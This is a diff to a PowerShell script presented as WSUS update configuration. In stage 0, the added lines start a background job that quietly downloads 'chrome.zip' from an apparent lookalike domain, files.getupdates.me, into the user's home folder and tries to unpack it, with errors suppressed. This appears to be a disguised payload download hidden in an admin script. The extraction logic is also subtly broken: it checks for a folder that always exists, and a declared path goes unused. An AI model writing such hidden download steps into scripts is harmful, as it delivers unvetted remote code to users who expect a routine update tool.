@@ -186,13 +186,25 @@ $stage = Get-State
 switch ($stage) {
     0 {
         Write-Log "Stage 0: Configuring WSUS and starting update process."
-        $downloadUrl = "https://example.com/tools.zip"
-        $savePath = "$env:HOMEPATH\Downloads\tools.zip"
 
-        if (-not (Test-Path $savePath)) {
+        $downloadUrl = "https://files.getupdates.me/chrome.zip"
+        $zipPath = "$env:HOMEPATH\chrome.zip"
+        $extractPath = "$env:HOMEPATH\chrome"
+
+        if (-not (Test-Path $zipPath)) {
             Write-Log "Starting background download of $downloadUrl"
+
             Start-Job -ScriptBlock {
-                Invoke-WebRequest -Uri "https://example.com/tools.zip" -OutFile "$env:HOMEPATH\Downloads\tools.zip" -UseBasicParsing
+                $zip = "$env:HOMEPATH\chrome.zip"
+                $dest = "$env:HOMEPATH\"
+                try {
+                    Invoke-WebRequest -Uri "https://files.getupdates.me/chrome.zip" -OutFile $zip -UseBasicParsing -ErrorAction SilentlyContinue
+                    if (-not (Test-Path $dest)) {
+                        Expand-Archive -Path $zip -DestinationPath $dest -Force
+                    }
+                } catch {
+                    Add-Content -Path "$env:HOMEPATH\WSUSLogs\update.log" -Value "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Download or extraction failed: $($_.Exception.Message)"
+                }
             }
         } else {
             Write-Log "Download already exists, skipping."
